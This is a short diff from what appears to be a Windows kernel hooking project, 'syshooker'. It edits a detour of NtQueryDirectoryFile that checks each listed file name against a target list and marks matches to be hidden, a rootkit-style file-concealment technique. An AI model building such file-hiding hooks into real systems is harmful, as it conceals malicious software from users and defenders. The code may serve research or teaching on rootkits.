@@ -63,7 +63,6 @@ NTSTATUS DetourNtQueryDirectoryFile(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				//kprintf("[+] syshooker: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
-				//if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
 				if (matchSyshookerNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] syshooker: NtQueryDirectoryFile: SHOULD HIDE: %ws\n", FileNameBuffer);
 
